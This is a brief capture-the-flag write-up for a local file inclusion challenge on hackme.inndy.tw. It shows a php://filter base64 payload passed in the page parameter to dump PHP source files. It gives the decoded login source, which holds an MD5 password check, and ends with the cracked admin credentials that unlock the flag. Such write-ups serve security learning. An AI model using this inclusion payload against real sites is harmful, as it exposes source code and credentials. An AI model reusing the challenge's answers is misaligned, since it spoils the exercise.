Write-up hackme FLI
===
* https://hackme.inndy.tw/
    * lfi/index.php`?page=`
        * pages/index
            `There is no second place like 127.0.0.1`
        * pages/intro
            `A good design pattern for php.`
        * pages/flag
            `Can you read the flag?`
        * pages/login
            ```html=
            <form action="?page=pages/login" method="post" role="form">
                <div class="form-group">
                    <label for="user-i">User</label>
                    <input type="text" class="form-control" id="user-i" placeholder="Username" name="user">
                </div>
                <div class="form-group">
                    <label for="pass-i">Password</label>
                    <input type="password" class="form-control" id="pass-i" placeholder="Password" name="pass">
                </div>
                <button type="submit" class="btn btn-primary">Login</button>
            </form>
            ```

https://hackme.inndy.tw/lfi/index.php?page=php://filter/convert.base64-encode/resource=pages/flag

* https://hackme.inndy.tw/
    * lfi/index.php`?page=php://filter/convert.base64-encode/resource=`
        * pages/index
            `VGhlcmUgaXMgbm8gc2Vjb25kIHBsYWNlIGxpa2UgMTI3LjAuMC4xCg==`
            `There is no second place like 127.0.0.1
        * pages/intro
            `QSBnb29kIGRlc2lnbiBwYXR0ZXJuIGZvciBwaHAuCg==`
            `A good design pattern for php.`
        * pages/flag
            `Q2FuIHlvdSByZWFkIHRoZSBmbGFnPD9waHAgcmVxdWlyZSgnY29uZmlnLnBocCcpOyA/Pj8K`
            `Can you read the flag<?php require('config.php'); ?>?`
        * pages/login
            `PD9waHAKcmVxdWlyZSgnY29uZmlnLnBocCcpOwppZigkX1BPU1RbJ3VzZXInXSA9PT0gJ2FkbWluJyAmJiBtZDUoJF9QT1NUWydwYXNzJ10pID09PSAnYmVkMTI4MzY1MjE2YzAxOTk4ODkxNWVkM2FkZDc1ZmInKSB7CiAgICBlY2hvICRmbGFnOwp9IGVsc2Ugewo/Pgo8Zm9ybSBhY3Rpb249Ij9wYWdlPXBhZ2VzL2xvZ2luIiBtZXRob2Q9InBvc3QiIHJvbGU9ImZvcm0iPgoJPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+CgkJPGxhYmVsIGZvcj0idXNlci1pIj5Vc2VyPC9sYWJlbD4KCQk8aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImZvcm0tY29udHJvbCIgaWQ9InVzZXItaSIgcGxhY2Vob2xkZXI9IlVzZXJuYW1lIiBuYW1lPSJ1c2VyIj4KCTwvZGl2PgoJPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+CgkJPGxhYmVsIGZvcj0icGFzcy1pIj5QYXNzd29yZDwvbGFiZWw+CgkJPGlucHV0IHR5cGU9InBhc3N3b3JkIiBjbGFzcz0iZm9ybS1jb250cm9sIiBpZD0icGFzcy1pIiBwbGFjZWhvbGRlcj0iUGFzc3dvcmQiIG5hbWU9InBhc3MiPgoJPC9kaXY+Cgk8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tcHJpbWFyeSI+TG9naW48L2J1dHRvbj4KPC9mb3JtPgo8P3BocCB9ID8+Cg==`
            ```html=
            <?php
                require('config.php');
                if($_POST['user'] === 'admin' && md5($_POST['pass']) === 'bed128365216c019988915ed3add75fb') {
                    echo $flag;
                } else {
            ?>
            <form action="?page=pages/login" method="post" role="form">
                <div class="form-group">
                    <label for="user-i">User</label>
                    <input type="text" class="form-control" id="user-i" placeholder="Username" name="user">
                </div>
                <div class="form-group">
                    <label for="pass-i">Password</label>
                    <input type="password" class="form-control" id="pass-i" placeholder="Password" name="pass">
                </div>
                <button type="submit" class="btn btn-primary">Login</button>
            </form>
            <?php } ?>
            ```
user:admin
password:md5(passw0rd)=bed128365216c019988915ed3add75fb
